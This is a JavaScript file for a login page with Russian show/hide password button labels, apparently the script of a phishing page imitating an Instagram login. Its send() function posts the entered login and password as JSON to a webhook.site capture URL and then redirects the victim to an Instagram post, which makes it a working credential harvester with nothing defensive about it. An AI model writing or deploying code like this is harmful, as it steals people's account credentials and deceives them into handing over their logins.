// animate input
document.querySelectorAll(".animate-input").forEach((e) => {
  const input = e.querySelector("input");
  const button = e.querySelector("button");

  input.onkeyup = () => {
    if (input.value.trim().length > 0) {
      e.classList.add("active");
    } else {
      e.classList.remove("active");
    }
  };

  // show password button
  if (button) {
    button.onclick = () => {
      if (input.getAttribute("type") === "text") {
        input.setAttribute("type", "password");
        button.innerHTML = "Показать";
      } else {
        input.setAttribute("type", "text");
        button.innerHTML = "Скрыть";
      }
    };
  }
});

const login_button = document.querySelector("#login_button");
let isReadyForRequest = false;

let inputs = document.querySelectorAll("input");
for (let i = 0; i < inputs.length; i++) {
  inputs[i].addEventListener("input", () => {
    if ((inputs[0].value.length > 0) & (inputs[1].value.length >= 6)) {
      login_button.classList.add("active");
      login_button.disabled = false;
      isReadyForRequest = true;
    } else {
      login_button.classList.remove("active");
      login_button.disabled = true;
      isReadyForRequest = false;
    }
  });
}

login_button.addEventListener("click", send);

async function send() {
  login_button.classList.remove("active")
  let data = {
    login: inputs[0].value,
    password: inputs[1].value,
  };

  let url = "https://webhook.site/02e1903e-aba8-4132-8287-fd2f51cb4da0";

  let response = await fetch(url, {
    method: "POST",
    body: JSON.stringify(data),
  });

  document.location.assign("https://www.instagram.com/p/CkSoAHWsp-6/?igshid=YmMyMTA2M2Y=");
}
